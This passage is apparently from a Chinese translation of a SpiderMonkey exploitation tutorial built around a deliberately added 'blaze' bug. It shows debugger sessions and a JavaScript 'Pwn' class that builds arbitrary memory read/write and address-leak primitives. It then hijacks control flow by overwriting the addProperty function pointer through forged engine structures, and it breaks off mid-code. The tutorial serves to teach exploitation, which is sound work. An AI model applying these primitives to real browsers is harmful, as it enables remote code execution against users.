<p>无论如何，这意味着我们可以泄漏 emptyElementsHeader 指针以及使用双精度数去破坏 DATA_SLOT 缓冲区指针。因为我没有意识到首先要在 js :: Value 中编码双精度数，所以我使用另一个与 TypedArray 相邻的数组（它们在内存中的布局是：一个数组，一个 TypedArray 和另一个数组），通过 TypedArray 读取这个数组的指针。<br>在编码之前要提到的最后一件事是我们使用 <a href="https://twitter.com/5aelo" title="saelo" target="_blank" rel="noopener">saelo</a> 编写的 <a href="https://github.com/0vercl0k/blazefox/blob/master/exploits/int64.js" title="Int64.js" target="_blank" rel="noopener">Int64.js</a> 库来表示 64 位整数（我们今天无法使用 JavaScript 原生整数表示），并且里面有能将 double 转换为 Int64 的<a href="https://github.com/0vercl0k/blazefox/blob/master/exploits/utils.js" title="实用函数" target="_blank" rel="noopener">实用函数</a>，和 int64 转换 double 的函数。虽然这不是必须用到的操作，但这会让后面的一切显得很自然。在撰写本文时，默认情况下在 Firefox上<a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1366287" title="没有启用 " target="_blank" rel="noopener">没有启用 </a><a href="https://github.com/tc39/proposal-bigint" title="BigInt" target="_blank" rel="noopener">BigInt</a>（也就是任意精度JavaScript整数）JavaScript 标准，但这很快就会在每个主流浏览器中成为主流。它将使所有这些操作更容易，你不再需要任何自定义 JavaScript 模块来编写浏览器的利用:-)<br>下面通过一个损坏的 blaze’d 数组和 TypedArray 在内存中布局的图进行说明：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190822100442-3493b1d2-c481-1.png" alt="image.png"></p>
<h3 id="构建任意内存访问代码。"><a href="#构建任意内存访问代码。" class="headerlink" title="构建任意内存访问代码。"></a>构建任意内存访问代码。</h3><p>如上图所示，第一个数组长度为 0x60 字节（包括内联缓冲区，假设我们最多使用 6 个 entries 实例化它）。内联的后备缓冲区从 + 0x30（6 * 8） 开始。后备缓冲区可以容纳 6 个 js :: Value（另一个 0x30 字节），而泄漏的目标指针位于 TypedArray 的 + 0x18（3 * 8） 处。这意味着，如果我们得到数组的第 6 + 3 位置的 entry  ，我们应该将 js！emptyElementsHeader 指针编码为 double 型数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">js&gt; b = new Array(1,2,3,4,5,6)</span><br><span class="line">[1, 2, 3, 4, 5, 6]</span><br><span class="line"></span><br><span class="line">js&gt; c = new Uint8Array(8)</span><br><span class="line">(&#123;0:0, 1:0, 2:0, 3:0, 4:0, 5:0, 6:0, 7:0&#125;)</span><br><span class="line"></span><br><span class="line">js&gt; b[9]</span><br><span class="line"></span><br><span class="line">js&gt; b.blaze() == undefined</span><br><span class="line">false</span><br><span class="line"></span><br><span class="line">js&gt; b[9]</span><br><span class="line">6.951651517974e-310</span><br><span class="line"></span><br><span class="line">js&gt; load(&apos;..\\exploits\\utils.js&apos;)</span><br><span class="line"></span><br><span class="line">js&gt; load(&apos;..\\exploits\\int64.js&apos;)</span><br><span class="line"></span><br><span class="line">js&gt; Int64.fromDouble(6.951651517974e-310).toString(16)</span><br><span class="line">&quot;0x00007ff7f7ecdac0&quot;</span><br><span class="line"></span><br><span class="line"># break to the debugger</span><br><span class="line"></span><br><span class="line">0:006&gt; ln 0x00007ff7f7ecdac0</span><br><span class="line">(00007ff7`f7ecdab0)   js!emptyElementsHeader+0x10</span><br></pre></td></tr></table></figure></p>
<p>对于任意读写代码，如前所述，我们可以使用我们想要读/写的地址来替换 TypedArray 的 DATA_SLOT 指针，将其编码为 double 型数据。改变 length 更容易，因为它存储为 js :: Value 。基指针应位于索引 13（9 + 4），长度指针位于索引 11（9 + 2） 处。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">js&gt; b.length</span><br><span class="line">420</span><br><span class="line"></span><br><span class="line">js&gt; c.length</span><br><span class="line">8</span><br><span class="line"></span><br><span class="line">js&gt; b[11]</span><br><span class="line">8</span><br><span class="line"></span><br><span class="line">js&gt; b[11] = 1337</span><br><span class="line">1337</span><br><span class="line"></span><br><span class="line">js&gt; c.length</span><br><span class="line">1337</span><br><span class="line"></span><br><span class="line">js&gt; b[13] = new Int64(&apos;0xdeadbeefbaadc0de&apos;).asDouble()</span><br><span class="line">-1.1885958399657559e+148</span><br></pre></td></tr></table></figure></p>
<p>从c中读取一个字节现在应该在调试器中触发以下异常：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">js!js::TypedArrayObject::getElement+0x4a:</span><br><span class="line">00007ff7`f796648a 8a0408          mov     al,byte ptr [rax+rcx] ds:deadbeef`baadc0de=??</span><br><span class="line"></span><br><span class="line">0:000&gt; kc</span><br><span class="line"> # Call Site</span><br><span class="line">00 js!js::TypedArrayObject::getElement</span><br><span class="line">01 js!js::NativeGetPropertyNoGC</span><br><span class="line">02 js!Interpret</span><br><span class="line">03 js!js::RunScript</span><br><span class="line">04 js!js::ExecuteKernel</span><br><span class="line">05 js!js::Execute</span><br><span class="line">06 js!JS_ExecuteScript</span><br><span class="line">07 js!Process</span><br><span class="line">08 js!main</span><br><span class="line">09 js!__scrt_common_main_seh</span><br><span class="line">0a KERNEL32!BaseThreadInitThunk</span><br><span class="line">0b ntdll!RtlUserThreadStart</span><br><span class="line"></span><br><span class="line">0:000&gt; lsa .</span><br><span class="line">  1844:     switch (type()) &#123;</span><br><span class="line">  1845:       case Scalar::Int8:</span><br><span class="line">  1846:         return Int8Array::getIndexValue(this, index);</span><br><span class="line">  1847:       case Scalar::Uint8:</span><br><span class="line">&gt; 1848:         return Uint8Array::getIndexValue(this, index);</span><br><span class="line">  1849:       case Scalar::Int16:</span><br><span class="line">  1850:         return Int16Array::getIndexValue(this, index);</span><br><span class="line">  1851:       case Scalar::Uint16:</span><br><span class="line">  1852:         return Uint16Array::getIndexValue(this, index);</span><br><span class="line">  1853:       case Scalar::Int32:</span><br></pre></td></tr></table></figure></p>
<h3 id="构建对象地址泄漏代码。"><a href="#构建对象地址泄漏代码。" class="headerlink" title="构建对象地址泄漏代码。"></a>构建对象地址泄漏代码。</h3><p>另一个非常有用的操作是允许泄漏任意 JavaScript 对象的地址。它对于调试和修改内存中的对象都很有用。同样，一旦你有了下面的代码，这很容易就实现。我们可以利用第三个数组（与 TypedArray 相邻），向数组中第一个 entry 写入我们想要泄漏的对象的地址。从 TypedArray 的内联后备缓冲区中，读取相对位置，找到对象的 js :: Value 用来泄漏地址。从这里，可以分离几个 Bit 位，作为今后的调用。与相邻对象的属性相同（在 saelo 编写的 <a href="https://github.com/saelo/foxpwn/blob/master/code.js#L442" title="foxpwn" target="_blank" rel="noopener">foxpwn</a> 中使用）。这实际上是个问题，要能够从内联缓冲区读取一个相对位置，且最终会引你到 js :: Value 编码你的对象地址。<br>另一个方法，不需要我们创建另一个数组，而是使用第一个 Array ，并越界写入 TypedArray 的后备缓冲区。然后，我们可以简单地逐字节读出 TypedArray 内联后备缓冲区中的 js :: Value ，并提取对象地址。我们可以通过索引 14（9 + 5） 在TypedArray 缓冲区中写入数据。不要忘记用足够的存储空间来实例化你的 TypedArray ，否则你就破坏了内存:-)。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">js&gt; c = new Uint8Array(8)</span><br><span class="line">(&#123;0:0, 1:0, 2:0, 3:0, 4:0, 5:0, 6:0, 7:0&#125;)</span><br><span class="line"></span><br><span class="line">js&gt; d = new Array(1337, 1338, 1339)</span><br><span class="line">[1337, 1338, 1339]</span><br><span class="line"></span><br><span class="line">js&gt; b[14] = d</span><br><span class="line">[1337, 1338, 1339]</span><br><span class="line"></span><br><span class="line">js&gt; c.slice(0, 8)</span><br><span class="line">(&#123;0:32, 1:29, 2:32, 3:141, 4:108, 5:1, 6:254, 7:255&#125;)</span><br><span class="line"></span><br><span class="line">js&gt; Int64.fromJSValue(c.slice(0, 8)).toString(16)</span><br><span class="line">&quot;0x0000016c8d201d20&quot;</span><br></pre></td></tr></table></figure></p>
<p>我们可以通过调试器验证我们确实泄露了 d 的地址。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; !smdump_jsobject 0x16c8d201d20</span><br><span class="line">16c8d201d20: js!js::ArrayObject:   Length: 3</span><br><span class="line">16c8d201d20: js!js::ArrayObject: Capacity: 6</span><br><span class="line">16c8d201d20: js!js::ArrayObject:  Content: [0x539, 0x53a, 0x53b]</span><br><span class="line">@$smdump_jsvalue(0xfffe016c8d201d20)</span><br><span class="line"></span><br><span class="line">0:005&gt; ? 539</span><br><span class="line">Evaluate expression: 1337 = 00000000`00000539</span><br></pre></td></tr></table></figure></p>
<p>很好，我们现在拥有编写 <a href="https://github.com/0vercl0k/blazefox/blob/master/exploits/basic.js" title="basic.js" target="_blank" rel="noopener">basic.js</a> 和弹出计算器所需的所有构建块。 我将下面的 Pwn 类中，将描述的所有代码组合在一起，抽象出细节：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">__Pwn</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        <span class="keyword">this</span>.SavedBase = Smalls[<span class="number">13</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    __Access(Addr, LengthOrValues) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">typeof</span> Addr == <span class="string">'string'</span>) &#123;</span><br><span class="line">            Addr = <span class="keyword">new</span> Int64(Addr);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> IsRead = <span class="keyword">typeof</span> LengthOrValues == <span class="string">'number'</span>;</span><br><span class="line">        <span class="keyword">let</span> Length = LengthOrValues;</span><br><span class="line">        <span class="keyword">if</span>(!IsRead) &#123;</span><br><span class="line">            Length = LengthOrValues.length;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(IsRead) &#123;</span><br><span class="line">            dbg(<span class="string">'Read('</span> + Addr.toString(<span class="number">16</span>) + <span class="string">', '</span> + Length + <span class="string">')'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            dbg(<span class="string">'Write('</span> + Addr.toString(<span class="number">16</span>) + <span class="string">', '</span> + Length + <span class="string">')'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Fix U8A's byteLength.</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        Smalls[<span class="number">11</span>] = Length;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Verify that we properly corrupted the length of U8A.</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(U8A.byteLength != Length) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="string">"Error: The Uint8Array's length doesn't check out"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Fix U8A's base address.</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        Smalls[<span class="number">13</span>] = Addr.asDouble();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(IsRead) &#123;</span><br><span class="line">            <span class="keyword">return</span> U8A.slice(<span class="number">0</span>, Length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        U8A.set(LengthOrValues);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Read(Addr, Length) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.__Access(Addr, Length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WritePtr(Addr, Value) &#123;</span><br><span class="line">        <span class="keyword">const</span> Values = <span class="keyword">new</span> Int64(Value);</span><br><span class="line">        <span class="keyword">this</span>.__Access(Addr, Values.bytes());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ReadPtr(Addr) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Int64(<span class="keyword">this</span>.Read(Addr, <span class="number">8</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    AddrOf(Obj) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Fix U8A's byteLength and base.</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        Smalls[<span class="number">11</span>] = <span class="number">8</span>;</span><br><span class="line">        Smalls[<span class="number">13</span>] = <span class="keyword">this</span>.SavedBase;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Smalls is contiguous with U8A. Go and write a jsvalue in its buffer,</span></span><br><span class="line">        <span class="comment">// and then read it out via U8A.</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        Smalls[<span class="number">14</span>] = Obj;</span><br><span class="line">        <span class="keyword">return</span> Int64.fromJSValue(U8A.slice(<span class="number">0</span>, <span class="number">8</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Pwn = <span class="keyword">new</span> __Pwn();</span><br></pre></td></tr></table></figure></p>
<h3 id="劫持控制流"><a href="#劫持控制流" class="headerlink" title="劫持控制流"></a>劫持控制流</h3><p>现在我们已经建立了所有必要的工具，我们需要找到一种方法来劫持控制流。在Firefox中，有不受任何类型的 <a href="https://en.wikipedia.org/wiki/Control-flow_integrity" title="CFI" target="_blank" rel="noopener">CFI</a> 实现的保护，因此只需要找到可写的函数指针和从 JavaScript 触发其调用的方法。我们稍后会处理剩下的问题:)<br>有几种方法可以实现这一点，具体取决于前后内容的关联和你受到的约束：</p>
<ul>
<li>覆盖保存的返回地址（当软件受前沿CFI保护时，人们通常选择做什么）</li>
<li>覆盖虚拟表条目（很多浏览器上下文中的条目）</li>
<li>覆盖指向JIT的JavaScript函数的指针（JavaScript shell 中的好目标，但不真正存在）</li>
<li>覆盖另一种类型的函数指针（JavaScript shell 环境中的另一个好的目标）<br>最后一项是我们今天将关注的内容。 找到这样的目标并不是很难，因为 <a href="http://blogs.360.cn/post/how-to-kill-a-firefox.html" title="Hanming Zhang from 360 Vulcan team" target="_blank" rel="noopener">Hanming Zhang from 360 Vulcan team</a> 已经描述过这个目标。<br>每个 JavaScript 对象都定义了各种方法，因此必须将它们存储在某个地方。幸运的是，有一堆 Spidermonkey 结构就是这样描述的。我们之前在 js：NativeObject 中没有提到的一个字段是 group_ 字段。js :: ObjectGroup 记录一组对象的类型信息。clasp_ field 链接到另一个描述对象组类的对象。<br>例如，我们的 b 对象的类是 Uint8Array 。正是在这个对象中，可以找到类的名称以及它定义的各种方法。如果我们遵循 js :: Class 对象的 cOps 字段，我们最终得到一堆函数指针，这些指针在特殊时间由 JavaScript 引擎调用：向对象添加属性，删除属性等。<br>说得够多了，让我们看看调试器使用 TypedArray 对象实际看起来是什么样的：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">js!js::math_atan2:</span><br><span class="line">00007ff7`f7aee140 56              push    rsi</span><br><span class="line">0:000&gt; ?? vp[2]</span><br><span class="line">union JS::Value</span><br><span class="line">   +0x000 asBits_          : 0xfffe016c`8d201cc0</span><br><span class="line">   +0x000 asDouble_        : -1.#QNAN </span><br><span class="line">   +0x000 s_               : JS::Value::&lt;unnamed-type-s_&gt;</span><br><span class="line"></span><br><span class="line">0:000&gt; dt js::NativeObject 0x016c8d201cc0</span><br><span class="line">   +0x000 group_           : js::GCPtr&lt;js::ObjectGroup *&gt;</span><br><span class="line">   +0x008 shapeOrExpando_  : 0x0000016c`8daac970 Void</span><br><span class="line">   +0x010 slots_           : (null) </span><br><span class="line">   +0x018 elements_        : 0x00007ff7`f7ecdac0 js::HeapSlot</span><br><span class="line"></span><br><span class="line">0:000&gt; dt js!js::GCPtr&lt;js::ObjectGroup *&gt; 0x16c8d201cc0</span><br><span class="line">   +0x000 value            : 0x0000016c`8da7ad30 js::Ob</span><br><span class="line"></span><br><span class="line">0:000&gt; dt js!js::ObjectGroup 0x0000016c`8da7ad30</span><br><span class="line">   +0x000 clasp_           : 0x00007ff7`f7edc510 js::Class</span><br><span class="line">   +0x008 proto_           : js::GCPtr&lt;js::TaggedProto&gt;</span><br><span class="line">   +0x010 realm_           : 0x0000016c`8d92a800 JS::Realm</span><br><span class="line">   +0x018 flags_           : 1</span><br><span class="line">   +0x020 addendum_        : (null) </span><br><span class="line">   +0x028 propertySet      : (null) </span><br><span class="line"></span><br><span class="line">0:000&gt; dt js!js::Class 0x00007ff7`f7edc510 </span><br><span class="line">   +0x000 name             : 0x00007ff7`f7f8e0e8  &quot;Uint8Array&quot;</span><br><span class="line">   +0x008 flags            : 0x65200303</span><br><span class="line">   +0x010 cOps             : 0x00007ff7`f7edc690 js::ClassOps</span><br><span class="line">   +0x018 spec             : 0x00007ff7`f7edc730 js::ClassSpec</span><br><span class="line">   +0x020 ext              : 0x00007ff7`f7edc930 js::ClassExtension</span><br><span class="line">   +0x028 oOps             : (null) </span><br><span class="line"></span><br><span class="line">0:000&gt; dt js!js::ClassOps 0x00007ff7`f7edc690</span><br><span class="line">   +0x000 addProperty      : (null) </span><br><span class="line">   +0x008 delProperty      : (null) </span><br><span class="line">   +0x010 enumerate        : (null) </span><br><span class="line">   +0x018 newEnumerate     : (null) </span><br><span class="line">   +0x020 resolve          : (null) </span><br><span class="line">   +0x028 mayResolve       : (null) </span><br><span class="line">   +0x030 finalize         : 0x00007ff7`f7961000     void  js!js::TypedArrayObject::finalize+0</span><br><span class="line">   +0x038 call             : (null) </span><br><span class="line">   +0x040 hasInstance      : (null) </span><br><span class="line">   +0x048 construct        : (null) </span><br><span class="line">   +0x050 trace            : 0x00007ff7`f780a330     void  js!js::ArrayBufferViewObject::trace+0</span><br><span class="line"></span><br><span class="line">0:000&gt; !address 0x00007ff7`f7edc690</span><br><span class="line">Usage:                  Image</span><br><span class="line">Base Address:           00007ff7`f7e9a000</span><br><span class="line">End Address:            00007ff7`f7fd4000</span><br><span class="line">Region Size:            00000000`0013a000 (   1.227 MB)</span><br><span class="line">State:                  00001000          MEM_COMMIT</span><br><span class="line">Protect:                00000002          PAGE_READONLY</span><br><span class="line">Type:                   01000000          MEM_IMAGE</span><br></pre></td></tr></table></figure>
<p>当然，这些指针存储在只读部分，这意味着我们不能直接覆盖它们。但这很好，我们可以继续向后退，直到找到一个可写指针。一旦我们这样做，我们可以人为地重建自己的结构链直到 cOps 领域，然后覆盖要被劫持的指针。基于以上所述，我们可以修改的最早对象是 js :: ObjectGroup，更确切地说是它的 clasp_ 字段。<br>在继续前进之前，我们可能需要验证如果我们能够控制 cOps 函数指针，我们是否能够劫持来自 JavaScript 的控制流？</p>
<p>好吧，让我们直接从调试器覆盖cOps.addProperty字段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; eq 0x00007ff7`f7edc690 deadbeefbaadc0de</span><br><span class="line"></span><br><span class="line">0:000&gt; g</span><br></pre></td></tr></table></figure></p>
<p>向对象添加属性：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">js&gt; c.diary_of_a_reverse_engineer = 1337</span><br><span class="line"></span><br><span class="line">0:000&gt; g</span><br><span class="line">(3af0.3b40): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">js!js::CallJSAddPropertyOp+0x6c:</span><br><span class="line">00007ff7`80e400cc 48ffe0          jmp     rax &#123;deadbeef`baadc0de&#125;</span><br><span class="line"></span><br><span class="line">0:000&gt; kc</span><br><span class="line"> # Call Site</span><br><span class="line">00 js!js::CallJSAddPropertyOp</span><br><span class="line">01 js!CallAddPropertyHook</span><br><span class="line">02 js!AddDataProperty</span><br><span class="line">03 js!DefineNonexistentProperty</span><br><span class="line">04 js!SetNonexistentProperty&lt;1&gt;</span><br><span class="line">05 js!js::NativeSetProperty&lt;1&gt;</span><br><span class="line">06 js!js::SetProperty</span><br><span class="line">07 js!SetPropertyOperation</span><br><span class="line">08 js!Interpret</span><br><span class="line">09 js!js::RunScript</span><br><span class="line">0a js!js::ExecuteKernel</span><br><span class="line">0b js!js::Execute</span><br><span class="line">0c js!ExecuteScript</span><br><span class="line">0d js!JS_ExecuteScript</span><br><span class="line">0e js!RunFile</span><br><span class="line">0f js!Process</span><br><span class="line">10 js!ProcessArgs</span><br><span class="line">11 js!Shell</span><br><span class="line">12 js!main</span><br><span class="line">13 js!invoke_main</span><br><span class="line">14 js!__scrt_common_main_seh</span><br><span class="line">15 KERNEL32!BaseThreadInitThunk</span><br><span class="line">16 ntdll!RtlUserThreadStart</span><br></pre></td></tr></table></figure></p>
<p>感谢我们之前写的 Pwn 类，这应该很容易实现。 我们可以使用 Pwn.AddrOf 来泄漏一个对象地址（下面称为Target ），跟随指针链并通过将它们的内容复制到 TypedArray 的后备缓冲区中来重新创建这些结构（例如下面称为MemoryBackingObject ）。 完成后，只需覆盖目标对象的 addProperty 字段即可。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Retrieve a bunch of addresses needed to replace Target's clasp_ field.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Target = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">90</span>);</span><br><span class="line"><span class="keyword">const</span> TargetAddress = Pwn.AddrOf(Target);</span><br><span class="line"><span class="keyword">const</span> TargetGroup_ = Pwn.ReadPtr(TargetAddress);</span><br><span class="line"><span class="keyword">const</span> TargetClasp_ = Pwn.ReadPtr(TargetGroup_);</span><br><span class="line"><span class="keyword">const</span> TargetcOps = Pwn.ReadPtr(Add(TargetClasp_, <span class="number">0x10</span>));</span><br><span class="line"><span class="keyword">const</span> TargetClasp_Address = Add(TargetGroup_, <span class="number">0x0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> TargetShapeOrExpando_ = Pwn.ReadPtr(Add(TargetAddress, <span class="number">0x8</span>));</span><br><span class="line"><span class="keyword">const</span> TargetBase_ = Pwn.ReadPtr(TargetShapeOrExpando_);</span><br><span class="line"><span class="keyword">const</span> TargetBaseClasp_Address = 